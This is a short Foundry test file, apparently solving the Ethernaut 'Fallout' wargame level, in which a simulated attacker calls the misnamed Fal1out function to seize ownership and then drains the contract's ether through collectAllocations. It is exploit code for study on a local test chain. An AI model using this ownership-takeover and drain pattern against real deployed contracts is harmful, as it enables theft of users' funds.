// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutTest is Test {
    Fallout fallout;
    address attacker = address(0xABCD);

    function setUp() public {
        fallout = new Fallout();
        vm.deal(attacker, 1 ether);
    }

    function testTakeOwnership() public {
        vm.prank(attacker);

        fallout.Fal1out();

        assertEq(fallout.owner(), attacker);
    }

    function testDrainFunds() public {
        // Step 1: attacker becomes owner
        vm.prank(attacker);
        fallout.Fal1out();

        // Step 2: send ETH to contract (simulate victim)
        vm.deal(address(fallout), 1 ether);

        uint256 attackerBefore = attacker.balance;

        // Step 3: withdraw funds
        vm.prank(attacker);
        fallout.collectAllocations();

        uint256 attackerAfter = attacker.balance;

        assertGt(attackerAfter, attackerBefore); // attacker got money
    }
}
